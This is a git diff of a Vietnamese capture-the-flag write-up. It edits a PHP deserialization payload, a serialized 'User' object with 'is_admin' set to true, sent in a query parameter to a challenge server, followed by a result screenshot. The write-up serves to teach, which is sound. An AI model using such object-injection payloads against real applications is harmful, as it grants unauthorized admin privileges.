@@ -122,7 +122,7 @@ is_admin -> Useris_admin vì 2 biến được đặt ở private nên serialize
 
 Bây giờ truyền payload vào:
 
-```http://45.122.249.68:10001/?code=O:4:%22User%22:3:{s:4:%22name%22;N;s:8:%22is_admin%22;b:1;s:7:%22getfl4g%22;s:7:%22getfl4g%22;}```
+```http://45.122.249.68:10001/?code=O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:7:"getfl4g";s:7:"getfl4g";}```
 
 <img width="1194" alt="Screen Shot 2021-10-20 at 00 04 22" src="https://user-images.githubusercontent.com/64759503/137958094-71571b3e-37b1-44eb-b21d-f52d6548f96a.png">
 
